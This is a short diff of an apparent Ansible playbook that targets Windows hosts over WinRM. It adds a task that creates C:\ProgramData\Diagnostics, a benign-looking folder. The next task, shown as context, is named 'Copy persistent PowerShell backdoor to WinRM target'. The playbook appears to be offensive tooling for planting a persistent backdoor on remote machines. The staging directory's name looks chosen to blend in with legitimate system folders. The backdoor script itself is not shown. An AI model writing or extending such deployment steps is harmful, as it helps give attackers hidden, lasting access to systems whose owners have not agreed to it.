@@ -16,6 +16,11 @@
 
     - name: Verify WinRM connectivity
       win_ping:
+      
+    - name: Make Directory
+      win_file:
+        path: C:\ProgramData\Diagnostics
+        state: directory
 
     - name: Copy persistent PowerShell backdoor to WinRM target
       win_copy:
